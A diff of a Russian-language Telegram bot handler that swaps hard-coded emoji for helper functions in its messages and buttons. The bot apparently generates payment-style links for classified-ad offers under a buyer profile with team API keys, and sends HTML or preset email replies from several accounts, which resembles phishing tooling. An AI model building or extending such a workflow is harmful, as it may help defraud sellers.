@@ -64,7 +64,7 @@ from services.translate import translate_to_ru, _strip_html
 # Email reply "presets" must use the same storage/UI as ⚡ Шаблоны (handlers/templates.py)
 from handlers.templates import load_templates, TemplateItem
 from utils.bg_jobs import is_running as bg_is_running, start as bg_start
-from utils.ui_emoji import back_inline, inline_button
+from utils.ui_emoji import html_emoji, inline_button, menu_path, msg_fail, msg_ok, msg_wait, msg_warn
 
 router = Router()
 
@@ -79,7 +79,7 @@ async def _run_aqua_link_bg(callback: CallbackQuery, work) -> None:
         logger.exception("aqua_link background failed tg=%s", callback.from_user.id)
         try:
             await callback.message.answer(
-                f"❌ <b>Ошибка создания ссылки</b>\n<code>{_e(str(e)[:300])}</code>",
+                f"{html_emoji('fail')} <b>Ошибка создания ссылки</b>\n<code>{_e(str(e)[:300])}</code>",
                 parse_mode="HTML",
             )
         except Exception:
@@ -110,7 +110,7 @@ async def _aqua_generate_link(
 ) -> str:
     user_key, team_key = await get_user_aqua_api_keys_async(session, user)
     if not user_key:
-        raise AquaError("Личный API-ключ не установлен. ⚙️ → 🔑")
+        raise AquaError(f"Личный API-ключ не установлен. {menu_path(('settings', ''), ('key', ''))}")
     from services.aqua_network import generate_api_configured
 
     if not generate_api_configured():
@@ -121,7 +121,7 @@ async def _aqua_generate_link(
 
     if not await user_profile_fields_complete(session, user):
         raise AquaError(
-            "Профиль не заполнен. ⚙️ → 🧾 Профиль → Заполнить / изменить."
+            f"Профиль не заполнен. {menu_path(('settings', ''), ('profile', 'Профиль'))} → Заполнить / изменить."
         )
     buyer_name = await get_user_profile_buyer_name(session, user)
     address = await get_user_profile_address(session, user)
@@ -213,15 +213,15 @@ async def _notify_reply_sent(bot, chat_id: int, ctx: ReplyNotifyCtx) -> None:
 
     if ctx.is_html:
         main = (
-            f"⚡️ Ответ: <b>[HTML]</b> успешно отправлен на <code>{to_addr}</code> "
-            f"с аккаунта <code>{from_acc}</code> ⚡️\n"
+            f"{html_emoji('burst')} Ответ: <b>[HTML]</b> успешно отправлен на <code>{to_addr}</code> "
+            f"с аккаунта <code>{from_acc}</code> {html_emoji('burst')}\n"
             f"От кого было входящее: <code>{incoming}</code>"
         )
     else:
         preview = _preview_reply_body(ctx.body_text, is_html=False)
         main = (
-            f"⚡️ <code>{from_acc}</code> — <b>{_e(preview)}</b> — <code>{to_addr}</code>\n\n"
-            f"успешно отправлен на <code>{to_addr}</code> с аккаунта <code>{from_acc}</code> ⚡️\n"
+            f"{html_emoji('burst')} <code>{from_acc}</code> — <b>{_e(preview)}</b> — <code>{to_addr}</code>\n\n"
+            f"успешно отправлен на <code>{to_addr}</code> с аккаунта <code>{from_acc}</code> {html_emoji('burst')}\n"
             f"От кого было входящее: <code>{incoming}</code>"
         )
 
@@ -253,11 +253,11 @@ async def _notify_reply_sent(bot, chat_id: int, ctx: ReplyNotifyCtx) -> None:
 
     footer: str | None = None
     if ctx.is_preset:
-        footer = "✅ Пресет отправлен"
+        footer = msg_ok("Пресет отправлен")
     elif ctx.is_html:
-        footer = "✅ HTML отправлен"
+        footer = msg_ok("HTML отправлен")
     elif ctx.is_link:
-        footer = "✅ Ссылка создана"
+        footer = msg_ok("Ссылка создана")
 
     if footer:
         try:
@@ -265,9 +265,10 @@ async def _notify_reply_sent(bot, chat_id: int, ctx: ReplyNotifyCtx) -> None:
                 int(chat_id),
                 footer,
                 reply_to_message_id=anchor,
+                parse_mode="HTML",
             )
         except Exception:
-            await bot.send_message(int(chat_id), footer)
+            await bot.send_message(int(chat_id), footer, parse_mode="HTML")
 
 
 def _reply_notify_from_state(
@@ -501,7 +502,7 @@ async def _bg_incoming_smtp(
                 await bot.send_message(chat_id, "✅ Отправлено.", parse_mode="HTML")
         else:
             err_s = _e(err or "unknown")
-            await bot.send_message(chat_id, f"❌ Ошибка SMTP:\n<code>{err_s}</code>", parse_mode="HTML")
+            await bot.send_message(chat_id, f"{html_emoji('fail')} Ошибка SMTP:\n<code>{err_s}</code>", parse_mode="HTML")
 
     if not bg_start(user_id, "smtp", _job()):
         try:
@@ -555,7 +556,7 @@ async def _bg_message_smtp(
                 await bot.send_message(chat_id, "✅ Отправлено.", parse_mode="HTML")
         else:
             err_s = _e(err or "unknown")
-            await bot.send_message(chat_id, f"❌ Ошибка SMTP:\n<code>{err_s}</code>", parse_mode="HTML")
+            await bot.send_message(chat_id, f"{html_emoji('fail')} Ошибка SMTP:\n<code>{err_s}</code>", parse_mode="HTML")
 
     if not bg_start(user_id, "smtp", _job()):
         await message.answer("⏳ Отправка уже идёт…")
@@ -577,24 +578,27 @@ def _is_primary_mail_reply_cb(data: str | None) -> bool:
 
 
 def _kb_reply_choice(acc_id: int, uid: str):
-    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+    from aiogram.types import InlineKeyboardMarkup
 
     uid_s = str(uid)
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(
-                    text="📄 Отправить пресет",
+                inline_button(
+                    "presets",
+                    "Отправить пресет",
                     callback_data=f"mail_reply_mode:preset:{acc_id}:{uid_s}",
                 ),
-                InlineKeyboardButton(
-                    text="🧩 Отправить HTML",
+                inline_button(
+                    "puzzle",
+                    "Отправить HTML",
                     callback_data=f"mail_reply_mode:html:{acc_id}:{uid_s}",
                 ),
             ],
             [
-                InlineKeyboardButton(
-                    text="🚫 Отмена",
+                inline_button(
+                    "cancel",
+                    "Отмена",
                     callback_data=f"mail_reply_mode:cancel:{acc_id}:{uid_s}",
                 )
             ],
@@ -676,7 +680,7 @@ async def _open_mail_reply_menu(
         ui = await callback.bot.send_message(
             int(card.chat.id),
             (
-                f"<b>✉️ Ответ на письмо</b>\n"
+                f"<b>{html_emoji('mail')} Ответ на письмо</b>\n"
                 f"Кому: <code>{_e(to_email)}</code>\n\n"
                 f"{REPLY_CHOICE_TEXT}"
             ),
@@ -1074,17 +1078,17 @@ async def _send_generated_link_card_to_chat(
     if reply_to:
         # Не дублируем «Получено сообщение на …» — это уже в карточке входящего (reply_to).
         head = (
-            f"⚡️ <code>{from_acc}</code> — <b>ссылка создана</b> — <code>{to_addr}</code>\n"
+            f"{html_emoji('burst')} <code>{from_acc}</code> — <b>ссылка создана</b> — <code>{to_addr}</code>\n"
             f"От кого было входящее: <code>{to_addr}</code>\n\n"
         )
 
     card_text = (
         f"{head}"
-        f"📣 <b>Объявления » {_e(service_label)}</b>\n\n"
+        f"{html_emoji('burst')} <b>Объявления » {_e(service_label)}</b>\n\n"
         f"📌 <b>Название:</b> {_e((offer_title or '').strip()) or '—'}\n"
         f"💰 <b>Цена:</b> {_e((offer_price or '').strip()) or '—'}\n"
-        f"👤 <b>Профиль:</b> <code>{_e((profile_display or '').strip()) or '—'}</code>\n\n"
-        f"🔗 <b>Ссылка:</b>\n{_e(link)}"
+        f"{html_emoji('user')} <b>Профиль:</b> <code>{_e((profile_display or '').strip()) or '—'}</code>\n\n"
+        f"{html_emoji('link')} <b>Ссылка:</b>\n{_e(link)}"
     )
 
     price_kb = None
@@ -1749,7 +1753,7 @@ async def _create_aqua_link_from_db_work(callback: CallbackQuery, mail_id: int) 
                 image=offer_image,
             )
         except AquaError as e:
-            await callback.message.answer(f"❌ <b>GAG API</b>\n<code>{_e(str(e)[:400])}</code>", parse_mode="HTML")
+            await callback.message.answer(f"{html_emoji('fail')} <b>GAG API</b>\n<code>{_e(str(e)[:400])}</code>", parse_mode="HTML")
             await callback.answer()
             return
 
@@ -1938,7 +1942,7 @@ async def _create_aqua_link_work(callback: CallbackQuery, acc_id: int, uid: str,
             )
         except AquaError as e:
             await callback.message.answer(
-                f"❌ <b>GAG API</b>\n<code>{_e(str(e)[:400])}</code>",
+                f"{html_emoji('fail')} <b>GAG API</b>\n<code>{_e(str(e)[:400])}</code>",
                 parse_mode="HTML",
             )
             return await callback.answer()
@@ -3091,14 +3095,14 @@ async def offer_price_set(message: Message, state: FSMContext):
         if ok:
             await bot.send_message(
                 chat_id,
-                f"✅ Цена обновлена: <code>{_e(info)}</code>\nНовая ссылка прикреплена к письму.",
+                f"{html_emoji('ok')} Цена обновлена: <code>{_e(info)}</code>\nНовая ссылка прикреплена к письму.",
                 parse_mode="HTML",
                 reply_to_message_id=anchor_id,
             )
         else:
             await bot.send_message(
                 chat_id,
-                f"❌ Не удалось пересоздать ссылку:\n<code>{_e(info)}</code>",
+                f"{html_emoji('fail')} Не удалось пересоздать ссылку:\n<code>{_e(info)}</code>",
                 parse_mode="HTML",
             )
 
